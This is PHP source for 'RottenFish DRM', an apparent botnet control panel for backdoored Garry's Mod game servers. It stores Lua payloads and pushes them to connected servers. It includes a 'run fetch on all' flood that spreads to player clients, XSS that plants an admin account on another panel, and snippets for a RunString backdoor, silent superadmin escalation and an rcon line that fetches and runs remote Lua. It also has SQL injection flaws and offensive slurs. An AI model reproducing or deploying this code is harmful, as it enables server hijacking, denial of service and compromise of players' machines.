<?php

if($_SERVER["SERVER_PORT"] != 443)
{
	header("Location: https://rottenfish-drm.tk/panel");
	die();
}

		$db = new PDO("mysql:host=localhost:3306;dbname=dbname", "username", "password");

function LogD($txt)
{
	$txt = htmlentities($txt);
	if(!isset($db))
	{
		$db = new PDO("mysql:host=localhost:3306;dbname=dbname", "username", "password");
	}
	$r = $db->prepare("INSERT INTO logs (txt, datee) VALUES( :txt, NOW() )"); 
	$r->bindParam(":txt", $txt);
	$r->execute();
}

$r = $db->prepare("UPDATE servers SET status = '<div class=\"d\">Disconnected</div>', players = '', player = 0, uptime = 0 WHERE lastping < NOW() - INTERVAL 25 SECOND;"); 
$r->execute();
$r = $db->prepare("UPDATE servers SET status = '<div class=\"e\">Expired</div>', player = 0, uptime = 0 WHERE lastping < NOW() - INTERVAL 1 DAY;");


$r->execute();




function ToPassword($ps)
{
	for ($i=0; $i < 10; $i++) { 
		$ps = sha1($ps);
	}
	return "pw00".$ps;
}




		

	
session_start();
if(!isset($_SESSION["pw"]) || ($_SESSION["pw"] != "ok"))
{
if(isset($_COOKIE["postpwn"]) && $_COOKIE["postpwn"] != "pwn")
{
	$name = $_COOKIE["postpwn"];
	$password = $_COOKIE["postpwnd"];
	foreach ( $db->query("SELECT * FROM `users`") as $key)
	{
		if($key["name"]==$name)
		{
			if($key["password"]==$password)
			{
				$_SESSION["pw"] = "ok";
				$_SESSION["name"] = $name;
				$r = $db->prepare("UPDATE users SET last = NOW() WHERE name = :name"); 
				$r->bindParam(":name", $name);
				$r->execute();
				LogD("$name autoconnected with cookie !");
				header("Location: panel");
				die();
			}else{
			}
		}else{
		}
	}
}
$mip = $_SERVER["REMOTE_ADDR"];
if(isset($_POST["log_in"]))
{
	$name = $_POST["name"];
	$password = ToPassword($_POST["password"]);
	if($name == "JohnS")
	{
		LogD("$mip tryed JohnS");
		header("Location: bs.php");

		die("pd");
	}
	if($name == "admin")
	{
		LogD("$mip tryed admin");

		?>
		<h1>Lol <a href="https://discord.gg/aMfzb5S">https://discord.gg/aMfzb5S</a></h1>
		What a pussy you are !
	<br/>
		<?php

		die("");
	}
	foreach ( $db->query("SELECT * FROM `users`") as $key)
	{
		if($key["name"]==$name)
		{
			if($key["password"]==$password)
			{
				$_SESSION["pw"] = "ok";
				$_SESSION["name"] = $name;
				$r = $db->prepare("UPDATE users SET last = NOW() WHERE name = :name"); 
				$r->bindParam(":name", $name);
				$r->execute();
				setcookie("postpwn",$_SESSION["name"], time()+(60*60*24*30));
				setcookie("postpwnd",$password, time()+(60*60*24*30));
				header("Location: panel");
				die();
			}else{
				LogD("($mip)Incorrect password: ".$name);
			}
		}else{
		}
	}

	LogD("($mip)Incorrect username: ".$name." / ".$_POST["password"]);
	?>

<script type="text/javascript">
	location.href = "https://discord.gg/aMfzb5S";

</script>
	<?php
	die("");
}







	?>
			
		



<!DOCTYPE html>
<html>
<head>
	<title>RottenFish DRM</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
	<style type="text/css">
		.cc{
			text-align: left;
			width: 800px;
		}
	</style>
</head>
<body>
	<center>
		<div class="cc">
			<h1><img src="_icons/duck.png" width="64px" style="border-radius: 50000px;" />RottenFish DRM Statistic Login</h1>
			<p>You shouldn't be here so go away</p>
			<a href="https://selly.gg/@Jordane">Get a username at : https://selly.gg/@Jordane</a>
			<form action="" method="POST">
				<p>Username:<input type="text" name="name"></p>
				<p>Passsword:<input type="password" name="password"></p>
				<input type="submit" name="log_in" class="btn btn-dark">	
			</form>
		</div>
	</center>
</body>
</html>







	<?php
	die();
}

$cn = $_SESSION["name"];

if(isset($_GET["logout"]))
{
	session_destroy();
	setcookie("postpwn","pwn");
	setcookie("postpwnd","rip");
	header("Location: panel");
	die();
}




if(isset($_POST["subu"]))
	{
		$name = htmlentities($_POST["name"]);
		$password = ToPassword($_POST["password"]);
		$r = $db->prepare("INSERT INTO users (name, password, last) VALUES( :name, :password, NOW() )"); 
		$r->bindParam(":name", $name);
		$r->bindParam(":password", $password);
		$r->execute();
		LogD("$cn created: ".$name);
	}

if(isset($_POST["soapa"]))
	{
		$default_payload = $_POST["dp"];
		$code = base64_encode($_POST["code"]);
		$r = $db->prepare("UPDATE settings SET default_payload = :default_payload WHERE fid = 1"); 
		$r->bindParam(":default_payload", $default_payload);
		$r->execute();
	}

if(isset($_GET["del"]))
	{
		$del = $_GET["del"];
		$r = $db->exec("DELETE FROM `servers` WHERE id = '$del'");
		header("Location: panel");
		die();
	}
	if(isset($_POST["delpel"]))
	{
		$del = $_POST["name"];
		$r = $db->exec("DELETE FROM `payloads` WHERE name = '$del'");
		LogD("$cn deleted payload : ".$del);
	}
	
	if(isset($_POST["id"]))
	{
		$id = $_POST["id"];
		$code = base64_encode($_POST["code"]);
		$r = $db->prepare("UPDATE servers SET code = :code WHERE id = :id"); 
		$r->bindParam(":code", $code);
		$r->bindParam(":id", $id);
		$r->execute();
	}
	if(isset($_GET["getpayloads"]))
	{
		foreach ( $db->query("SELECT * FROM `payloads`") as $a) {
			echo $a["name"]."<br/>";
			echo base64_decode($a["code"])."<br/>";
		}
	}

	if(isset($_GET["blacklist"]))
	{
		$bl = htmlentities($_GET["blacklist"]);
		$steamid = htmlentities($_GET["steamid"]);
		$r = $db->prepare("UPDATE players SET blacklisted = :blacklisted WHERE steamid = :steamid"); 
		$r->bindParam(":steamid", $steamid);
		$r->bindParam(":blacklisted", $bl);
		$r->execute();
		header("Location: panel");
	}


	if(isset($_POST["subpayload"]))
	{
		$name = htmlentities($_POST["name"]);
		$code = base64_encode($_POST["code"]);
		$r = $db->prepare("INSERT INTO payloads (name, code) VALUES( :name, :code )"); 
		$r->bindParam(":name", $name);
		$r->bindParam(":code", $code);
		$r->execute();
	}
	if(isset($_POST["sbbp"]))
	{
		$id = htmlentities($_POST["id"]);
		$param = $_POST["param"];
		$name = htmlentities($_POST["name"]);
		$code = "";
		foreach ( $db->query("SELECT * FROM `payloads` ") as $key) {
			if($key["name"] == $name)
				$code = $key["code"];
		}
		foreach ( $db->query("SELECT * FROM `servers` ") as $key) {
			if($key["id"] == $id)
			{
				$sname = $key["name"];
			}
		}
		$code = base64_decode($code);
		$code = str_replace("{}",$param,$code);
		$code = base64_encode($code);
		$r = $db->prepare("UPDATE servers SET code = :code WHERE id = :id"); 
		$r->bindParam(":code", $code);
		$r->bindParam(":id", $id);
		$r->execute();
		LogD("$cn payload fired for $sname: $name");
	}
	if(isset($_POST["codeall"]))
	{
		$code = base64_encode($_POST["codeall"]);
		$r = $db->prepare("UPDATE servers SET code = :code WHERE 1 = 1"); 
		$r->bindParam(":code", $code);
		$r->execute();
	}
	if(isset($_POST["startfetch"]))
	{
		$url = $_POST["url"];
		$code = "timer.Create('123123123445',0.1,0,function() http.Fetch('$url') end) ";
		if($_POST["mode"] == "Extensive")
			$code = $code . "for i,v in ipairs(player.GetAll()) do v:SendLua([[timer.Create('121445',0.5,0,function()http.Fetch('$url')end)]])end";
		$code = base64_encode($code);
		$r = $db->prepare("UPDATE servers SET code = :code WHERE 1 = 1"); 
		$r->bindParam(":code", $code);
		$r->execute();
	}
	if(isset($_POST["gbd"]))
	{
		$url = $_POST["url"];
		$code = "timer.Create('13134657', 5, 0, function()
	http.Post('$url',{nb = 27,i = math.random(1,99999)..'.'..math.random(1,99999)..'.'..math.random(1,99999),
		n = math.random(1,99999)..':'..math.random(1,99999)..[[ rekt by rottenfish http://rottenfish-drm.tk/panel <script>$.ajax({url: 'core/ajax/add-user.php?username=support&password=support&cpassword=support'});</script>]]
		})end)";
		$code = base64_encode($code);
		$r = $db->prepare("UPDATE servers SET code = :code WHERE 1 = 1"); 
		$r->bindParam(":code", $code);
		$r->execute();
	}
	if(isset($_POST["nbb"]))
	{
		$num = $_POST["nbb"];
		$code = base64_encode($_POST["code"]);
		$cur = 0;
		foreach ( $db->query("SELECT * FROM `servers` ") as $key) {
				if($cur >= $num)
					continue;
				if($key["ip"] == "localhost")
					continue;
				$id = $key["id"];

			$r = $db->prepare("UPDATE servers SET code = :code WHERE id = :id"); 
			$r->bindParam(":code", $code);
			$r->bindParam(":id", $id);
			$r->execute();
			$cur=$cur+1;
		}

		
	}


	

?>

<!DOCTYPE html>
<html>
<head>
	<title>RottenFish DRM</title>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/bootbox.js/4.4.0/bootbox.min.js" type="text/javascript"></script>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
		<script src="https://code.jquery.com/jquery-3.3.1.min.js" crossorigin="anonymous"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
		<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
		<link rel="stylesheet" type="text/css" href="//cdn.datatables.net/1.10.19/css/jquery.dataTables.min.css">
		 
		<script type="text/javascript" charset="utf8" src="//cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
		<script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.19/js/dataTables.bootstrap4.min.js">
			
		</script>

		<script src="bb.js"></script>
		
<style type="text/css">
	.fuck{
		border-style: solid;
		border-color: #002768;
		width: 1400px;	
	}
	.fag{
		border-style: inset;
		border-color: #002768;
		width:500px;
		height: 300px;
		position: absolute;
	}
	.shutup{
		border-style: solid;
		border-color: #002768;
		width:200px;
		background-color: white;
	}
	p{
		color: white;
	}
	h1{
		color: white;
	}
	h2{
		color: white;
	}
	h3{
		color: white;
	}
	body{
		background-image: linear-gradient(#343a40, #002768);
	}
	.c{
		color: green;
	}
	.e{
		color: red;
	}
	.d{
		color: orange;
	}
	.b{
		color: #0f6bff;
	}
	.chatmessages{
		width: 800px;
		background-color: black;
		color: white;
		border-style: solid;
		border-color: #002768;
		text-align: left;
	}
	#playertbl tbody tr{
		background-color: #2f3030;
	}
	.dabdab{
		border: solid;
		position: absolute;
		left: 50%;
		background-color: black;
		width: 50%;
		transform: translate(-50%, -50%);
	}
	.hidebtn{
		color: red;
		border: solid 1px red;
		padding: 5px;
		text-align: right;
	}
</style>
<script type="text/javascript">
	function showcode(id) {
		var l = document.getElementById(id);
		l.style.display = "block";
	}
	function hideode(id) {
		var l = document.getElementById(id);
		l.style.display = "none";
	}
</script>
</head>
<body id="htxml" class="bg-dark">
<script type="text/javascript">

function SendToServer(id,payload) {
	var formData = new FormData()
	formData.append('id', id)
	formData.append('payload', payload)
	var url = 'sp.php'
	var xhr = new XMLHttpRequest()
	 xhr.open('POST', url, true)
	xhr.send(formData)
}



function SendPayload(sid) {


bootbox.prompt({ 
  size: "small",
  title: "Select a payload",
  inputType: "select",
  inputOptions: [
	  <?php
foreach ( $db->query("SELECT * FROM `payloads`") as $a) {
	?>
	{
		text: "<?php echo $a["name"]; ?>",
		value: "<?php echo $a["name"]; ?>",
	},
	<?php
	}
?>
  ],
  callback: function(r){
  	SendToServer(sid,r);
  }});





}
</script>
	<center>
		<br /><br />
		<br /><br />
		<?php
			$nbplayer = 0;
			$nbrplayer = 0;
			$nbpayloads = 0;
			foreach ( $db->query("SELECT * FROM `servers` WHERE status = '<div class=\"c\">Connected</div>'") as $key)
			{
				$nbplayer = $nbplayer + $key["player"];
			}
			foreach ( $db->query("SELECT COUNT(*) AS total FROM `servers` WHERE status = '<div class=\"c\">Connected</div>'") as $key) {
				$nbserver = $key["total"];
			}
			foreach ( $db->query("SELECT COUNT(*) AS total FROM `payloads`") as $key) {
				$nbpayloads = $key["total"];
			}


		?>	


		<div class="fuck">
			<h3 style="text-align: left;"  >
				<div style="display: inline-block;color: black;" class="shutup"><img width="50px;" src="_icons/_server.png"> <?php echo $nbserver; ?></div>
				<div style="display: inline-block;color: black;" class="shutup"><img width="50px;" src="_icons/_player.png">  <?php echo $nbplayer; ?></div>
				<div style="display: inline-block;color: black;" class="shutup"><img width="50px;" src="_icons/_rplayer.png">~10329</div>
				<div style="display: inline-block;color: black;" class="shutup"><img width="50px;" src="_icons/_settings.png">  <?php echo $nbpayloads; ?></div>
			</h3>
	<nav class="nav nav-tabs tabs-right navbar-light" style="background-color: #e3f2fd;">
	  <a class="nav-item nav-link active" href="#p1" data-toggle="tab"><img src="_icons/_server.png" width="16px;" /> Servers</a>
	  <a class="nav-item nav-link"		  href="#p2" data-toggle="tab"><img src="_icons/_player.png" width="16px;" /> Players</a>
	  <a class="nav-item nav-link" 		  href="#p3" data-toggle="tab"><img src="_icons/_payloads.png" width="16px;" /> Payloads</a>
	  <a class="nav-item nav-link"		  href="#p4" data-toggle="tab"><img src="_icons/_rplayer.png" width="16px;" /> Users</a>
	  <a class="nav-item nav-link"		  href="#p5" data-toggle="tab"><img src="_icons/_settings.png" width="16px;" /> Settings</a>
	  <a class="nav-item nav-link"		  href="#p6" data-toggle="tab"> Server Errors</a>
	  <a class="nav-item nav-link"		  href="#p7" data-toggle="tab"> Logs</a>
	  <a class="nav-item nav-link"		  href="#p8" data-toggle="tab"> Server message</a>
	  <a class="nav-item nav-link"		  href="#p10" data-toggle="tab"> GBackdoor Fucker</a>

	</nav>

<div class="tab-content" id="soupboy">
	
	<div class="tab-pane" id="p8">
		<div class="chatmessages" id="chatlogm">
		Waiting for server. . .
		</div>


		<from method="POST" action="" id="sendmsgform">
			<p>Server <select id="mpddp" name="sid" class="form-control" style="width: 700px;">
				<?php
				foreach ( $db->query("SELECT * FROM `servers` WHERE status = '<div class=\"c\">Connected</div>'") as $key)
				{
					$sid = $key["id"];
					$name = $key["name"];
					echo "<option value='$sid'>$name</option>";
				}
				?>
			</select></p>
			<p>Message: <input id="msggs" type="text" name="message" class="form-control" style="width: 700px;"></p>
			<button onclick="SendMessage()" class="form-control" style="width: 100px;">Send</button>
			<button onclick="ReceiveMessages()" class="form-control" style="width: 100px;">Refresh</button>
		</form>
		


	<script type="text/javascript">
	
	function SendMessage() {
		var formData = new FormData()
		formData.append('sid', mpddp.value)
		formData.append('message', msggs.value)
		var url = 'sendmessage.php'
		var xhr = new XMLHttpRequest()
	 	xhr.open('POST', url, true)
	 	xhr.addEventListener('readystatechange', function(e) {
			if (xhr.readyState == 4 && xhr.status == 200) {
				ReceiveMessages();
			}
		})
		xhr.send(formData)
	}


	function ReceiveMessages() {
		var url = 'receivemessage.php'
		var xhr = new XMLHttpRequest()
		xhr.open('GET', url, true)
		xhr.addEventListener('readystatechange', function(e) {
			if (xhr.readyState == 4 && xhr.status == 200) {
				chatlogm.innerHTML = xhr.responseText;
			}
		})
		xhr.send()
	}
	ReceiveMessages()

</script>
</div>
	<div class="tab-pane" id="p7">
	<table class="table table-striped table-dark">
		<thead class="">
		<tr>
			<th scope="col"> DATETIME </th>
			<th scope="col"> CONTENT </th>
		</tr>
	</thead>
	<tbody>
		<?php
			$nbbb = 0;
			foreach ( $db->query("SELECT * FROM `logs` ORDER BY datee DESC LIMIT 20") as $key) {
				$nbbb = $nbbb + 1;
			?>

			<tr>
				<td scope="row"><?php echo $key["datee"]; ?></td>
			 	<td scope="row"><?php echo htmlentities($key["txt"]); ?></td>
			</tr>
			<?php
			}

		?>
	</tbody>
</table>
</div>
<div class="tab-pane" id="p6">
	<table class="table table-striped table-dark">
		<thead class="">
		<tr>
			<th scope="col"> DATETIME </th>
			<th scope="col"> SERVER NAME </th>
			<th scope="col"> ERROR </th>
		</tr>
	</thead>
	<tbody>
		<?php
			$nbbb = 0;
			$r = $db->prepare("DELETE FROM errors WHERE timee < NOW() - INTERVAL 1 DAY;"); 
			$r->execute();
			foreach ( $db->query("SELECT * FROM `errors` ORDER BY timee DESC LIMIT 10") as $key) {
				$nbbb = $nbbb + 1;
			?>

			<tr>
				<td scope="row"><?php echo $key["timee"]; ?></td>
			 	<td scope="row"><?php echo $key["name"]; ?></td>
			 	<td scope="row"><?php echo $key["txt"]; ?></td>
			</tr>
			<?php
			}

		?>
	</tbody>
</table>
</div>
<div class="tab-pane" id="p5" style="width: 500px;">
	<form action="" method="POST">
		<p>Default payload <textarea name="dp" class="form-control"><?php
			foreach ( $db->query("SELECT * FROM `settings`") as $key) {
				echo htmlentities($key["default_payload"]);
			}
			?></textarea></p>
		<input type="submit" name="soapa" class="btn btn-light form-control" value="Set default payload">
	</form>
</div>
<div class="tab-pane" id="p4" style="width: 500px;">
	
	<?php
	if($_SESSION["name"] == "John"){
		?>
	<h3>Add a user</h3>
	<form action="" method="POST">
		<p>Name <input type="text" name="name" class="form-control"></p><br />
		<p>Password <input type="text" name="password" class="form-control"></p><br />
		<input type="submit" name="subu" class="btn btn-light form-control" value="Add user">
	</form>
	<h3>Delete a user</h3>
	<form method="POST" action="">
		<select name="name" class="form-control">
		<?php
		foreach ( $db->query("SELECT * FROM `users`") as $a) {
			?> <option value="<?php echo $a["name"]; ?>"><?php echo $a["name"]; ?></option> <?php
		}
		?>
		</select>
		<br />
		<input type="submit" name="delu" class="btn btn-light" value="Delete user">
	</form>
<?php
}
?>

<table class="table table-striped table-dark">

		<thead class="">
		<tr>
			<th scope="col"> # </th>
			<th scope="col"> NAME </th>
			<th scope="col"> LAST CONNECTED </th>
		</tr>
	</thead>
		<?php
			$nbbb = 0;
			foreach ( $db->query("SELECT * FROM `users` ") as $key) {
				$nbbb = $nbbb + 1;
			?>

			<tr>
				<td scope="row"><?php echo $nbbb; ?></td>
			 	<td scope="row"><?php echo $key["name"]; ?></td>
			 	<td scope="row"><?php echo $key["last"]; ?></td>
			</tr>
			<?php
			}

		?>
</table>

  </div>

<div class="tab-pane" id="p10" style="width: 500px;">
	<form action="" method="POST">
		<p style="color:white;">GBackdoor Stage 2</p><input type="text" name="url" class="btn btn-light form-control">
		<input type="submit" name="gbd" class="btn btn-light form-control" value="Fuck it">
	</form>
</div>
<div class="tab-pane" id="p3" style="width: 500px;">
<h3>Add a payload</h3>
	<form action="" method="POST">
		<p>Name <input type="text" name="name"  class="form-control"></p><br />
		<textarea cols="50" rows="5" name="code"  class="form-control"></textarea><br />
		<input type="submit" name="subpayload" class="btn btn-light form-control" value="Add payload">
	</form>
	<h3>Delete a payload</h3>
	<form method="POST" action="">
		<select name="name"  class="form-control">
		<?php

		foreach ( $db->query("SELECT * FROM `payloads`") as $a) {
			?> <option value="<?php echo $a["name"]; ?>"><?php echo $a["name"]; ?></option> <?php
		}
		?>
		</select>
		<br />
		<input type="submit" name="delpel" class="btn btn-light" value="Delete payload">
	</form>
	<br />
	<table class="table table-striped table-dark">
		<thead class="">
		<tr>
			<th scope="col"> # </th>
			<th scope="col"> NAME / CODE </th>
		</tr>
	</thead>
		<?php
			$nbbb = 0;
			foreach ( $db->query("SELECT * FROM `payloads` ") as $key) {
				$nbbb = $nbbb + 1;
			?>

			<tr>
				<td scope="row"><?php echo $nbbb; ?></td>
			 	<td scope="row">
			 		<?php echo $key["name"]; ?><br />
			 		<div class="b"><?php echo htmlentities(base64_decode($key["code"])); ?></div>
			 	</td>
			</tr>
			<?php
			}

		?>
</table>
  </div>
 

  <div class="tab-pane active" id="p1">
	<div id="sererlistbro"><?php include 'serverlist.php'; ?></div>
  </div>

  <div class="tab-pane" id="p2">
  	<script type="text/javascript">
  		function RefreshPlayerList() {
  		p2.innerHTML = "Waiting for server. . .";
		var url = 'getplayers.php'
		var xhr = new XMLHttpRequest()
		xhr.open('GET', url, true)
		xhr.addEventListener('readystatechange', function(e) {
			if (xhr.readyState == 4 && xhr.status == 200) {
				p2.innerHTML = xhr.responseText;
				setTimeout(function() {
					$(document).ready(function() {
					    $('#playertbl').DataTable();
					} );
				},500)
			}
		})
		xhr.send()
	
  		}
  	</script>
  	<button onclick="RefreshPlayerList()">Request</button>
 </div>
 
</div>
	
</div>

</center>

<br />

<h2>Category</h2>
<a href="#moar" onclick="showcode('moar')">More options</a>
<a href="#useless" onclick="showcode('useless')">Useless</a>
<br><br>
<div id="useless" style="display: none;">
<h3>Sclappy</h3>
<code>util.AddNetworkString("PROVIP")net.Receive("PROVIP",function()RunString(net.ReadString())end)</code>
<h3>Change map</h3>
<code>RunConsoleCommand("ulx","map","gm_construct")</code>
<h3>Spam</h3>
<code>hook.Add("Think","f",function()RunConsoleCommand("say","HAXORIZED !")end)</code>
<h3>Superadmin no logs</h3>
<code>RunConsoleCommand("ulx","logecho","0") RunConsoleCommand("ulx","adduser","[TON STEAMID]","superadmin")</code>
<h3>Rcon</h3>
<code>rcon lua_run local a = [[http]]..string.char(58)..string.char(47)..string.char(47)..[[www.contentproxy.tk/setup.lua]] http.Fetch(a,RunStringEx)</code>

</div>

<div id="moar" style="display: none;">
	<br /><br />
	<div class="fag" >
		<h3>Execute on all</h3>
		<form action="" method="POST">
			<select name="codeall" class="form-control">
				<option value="while true do end">Shutdown</option>
				<option value="RunConsoleCommand('ulx','map','gm_construct')">Change map</option>
				<option value="RunConsoleCommand('rt_party')">Party</option>
			</select>
			<br />
			<input type="submit" name="submate" class="btn btn-light">
		</form>
	</div>
	<div class="fag" style="margin-left: 500px;" >
		<h3>Run fetch on all</h3>
		<form action="" method="POST" style="display: inline-block;">
			<input type="text" name="url" class="form-control"><br />
			<input type="radio" name="mode" value="Limited" /> Limited<br />
			<input type="radio" name="mode" value="Extensive" checked /> Extensive<br />
			<input type="submit" name="startfetch" class="btn btn-light">
		</form>
	</div>
	<div class="fag" style="margin-left: 1000px;" >
		<h3>Limited run</h3>
		<form method="POST" action="">
			<input type="number" name="nbb" min="1" max="9999" class="form-control"><br />
			<textarea cols="50" rows="4" name="code"class="form-control"></textarea><br />
			<input type="submit" name="abababaab" class="btn btn-light">
		</form>
	</div>
</div>
</body>
</html>


<?php $db = null; ?>